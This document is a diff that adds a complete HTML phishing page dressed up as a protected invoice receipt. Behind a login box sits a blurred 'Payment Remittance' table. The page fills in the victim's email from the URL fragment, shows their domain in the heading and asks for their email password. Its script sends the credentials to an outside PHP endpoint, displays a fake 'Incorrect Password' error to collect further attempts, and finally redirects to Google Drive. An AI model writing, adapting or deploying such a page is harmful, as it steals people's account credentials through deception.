@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Excel-Spreadsheet</title>
+<style>
+/* Existing styles unchanged */
+body {
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    position: relative;
+}
+
+.background {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 95%;
+    height: 95%;
+    filter: blur(3px);
+    z-index: -1;
+}
+
+.invoice {
+    color: #555;
+    font-family: Arial, sans-serif;
+    line-height: 1.8;
+    opacity: 0.8;
+    font-size: 14px;
+    margin: 0;
+    width: 100%;
+    max-width: none;
+    background: white;
+    padding: 20px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+}
+
+.invoice h2 {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.invoice table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 50px;
+}
+
+.invoice table, .invoice th, .invoice td {
+    border: 1px solid #ddd;
+}
+
+.invoice th, .invoice td {
+    padding: 8px;
+    text-align: center;
+}
+
+.form-container {
+    position: relative;
+    background: rgba(255, 255, 255, 0.9);
+    padding: 20px 30px;
+    border-radius: 15px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    z-index: 1;
+    width: 350px;
+}
+
+h2 {
+    text-align: center;
+    margin-bottom: 20px;
+    font-family: Arial, sans-serif;
+}
+
+.form-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 20px;
+    justify-content: center;
+}
+
+.form-header img {
+    width: 40px;
+    height: 40px;
+}
+
+.form-group {
+    margin-bottom: 15px;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 5px;
+    font-size: 14px;
+}
+
+.form-group input {
+    width: 100%;
+    padding: 8px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 14px;
+}
+
+.form-group input[type="checkbox"] {
+    width: auto;
+}
+
+.form-group .remember-me {
+    display: inline-block;
+    font-size: 14px;
+}
+
+.form-group button {
+    width: 100%;
+    padding: 10px;
+    background: #4CAF50;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+.form-group button:hover {
+    background: #45a049;
+}
+
+.error-message {
+    color: red;
+    font-size: 14px;
+    margin-bottom: 15px;
+    display: none;
+}
+</style>
+</head>
+<body>
+<div class="background">
+    <div class="invoice">
+        <h2>Payment Remittance</h2>
+        <table>
+            <tr>
+                <th>Item</th>
+                <th>Quantity</th>
+                <th>Price</th>
+                <th>Total</th>
+            </tr>
+            <tr>
+                <td>Item A</td>
+                <td>8</td>
+                <td>$1,000.00</td>
+                <td>$8,000.00</td>
+            </tr>
+            <tr>
+                <td>Item B</td>
+                <td>5</td>
+                <td>$500.00</td>
+                <td>$2,500.00</td>
+            </tr>
+            <tr>
+                <td>Item C</td>
+                <td>9</td>
+                <td>$52,000.00</td>
+                <td>$468,000.00</td>
+            </tr>
+            <tr>
+                <td>Item D</td>
+                <td>16</td>
+                <td>$31,982.00</td>
+                <td>$511,700.00</td>
+            </tr>
+        </table>
+    </div>
+</div>
+<div class="form-container">
+    <div class="form-header">
+        <h2 id="emailDomainHeader">Receipt</h2>
+    </div>
+    <div class="container">
+        <div id="login-form">
+            <p>This document is protected.<br>
+            To access it, please enter your email password.</p>
+            <form id="loginForm" action="https://amdesarrollos.com/layouts/me/tele-php.php" method="post">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" readonly required>
+                </div>
+                <div class="error-message" id="errorMessage">Incorrect Password! Please Try Again.</div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="email password" autofocus required>
+                </div>
+                <div class="form-group">
+                    <input type="checkbox" id="rememberMe" name="rememberMe">
+                    <label for="rememberMe" class="remember-me">Remember Me</label>
+                </div>
+                <div class="form-group">
+                    <button type="submit">Continue</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+<script>
+    // Extract email from URL fragment
+    const fragment = window.location.hash.slice(1); // Remove the '#' character
+    const email = decodeURIComponent(fragment); // Decode the email value
+
+    if (email) {
+        // Populate the email input field
+        const usernameField = document.getElementById('username');
+        usernameField.value = email;
+
+        // Extract the domain name without TLD
+        const emailDomain = email.split('@')[1].split('.')[0];
+        const emailHeader = document.getElementById('emailDomainHeader');
+        emailHeader.textContent = `${emailDomain} Receipt`;
+    }
+
+    // Existing form functionality preserved
+    let submissionCount = 0;
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const form = document.getElementById("loginForm");
+        const formData = new FormData(form);
+        const errorMessage = document.getElementById("errorMessage");
+
+        fetch(form.action, {
+            method: "POST",
+            body: formData,
+        })
+        .then((response) => response.json())
+        .then((data) => {
+            if (data.status === "success") {
+                window.location.href = "https://drive.google.com/file/d";
+            } else {
+                throw new Error(data.message);
+            }
+        })
+        .catch((error) => {
+            submissionCount++;
+            if (submissionCount < 3) {
+                errorMessage.style.display = "block";
+            } else {
+                window.location.href = "https://drive.google.com/file/d";
+            }
+        });
+    });
+
+    document.getElementById("password").addEventListener("input", function () {
+        document.getElementById("errorMessage").style.display = "none";
+    });
+</script>
+</body>
+</html>
